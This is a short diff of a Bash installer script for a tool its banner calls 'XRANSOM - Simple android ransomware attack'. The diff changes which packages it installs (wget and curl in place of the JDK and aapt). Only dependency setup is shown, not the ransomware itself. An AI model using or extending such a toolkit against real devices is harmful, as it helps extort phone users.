@@ -7,10 +7,10 @@ w="\033[0m"
 echo -e $b">"$w" XRANSOM - Simple android ransomware attack"
 echo -e $b">"$w" prepare for installing dependencies ..."
 sleep 3
-echo -e $b">"$w" installing package: "$g"default-jdk"$w
-apt-get install default-jdk -y
-echo -e $b">"$w" installing package: "$g"aapt"$w
-apt-get install aapt zipalign -y
+echo -e $b">"$w" installing package: "$g"wget"$w
+apt-get install wget -y
+echo -e $b">"$w" installing package: "$g"curl"$w
+apt-get install curl -y
 echo -e $b">"$w" installing package: "$g"apktool"$w
 apt-get install apktool -y
 echo -e $b">"$w" installing package: "$g"imagemagick"$w
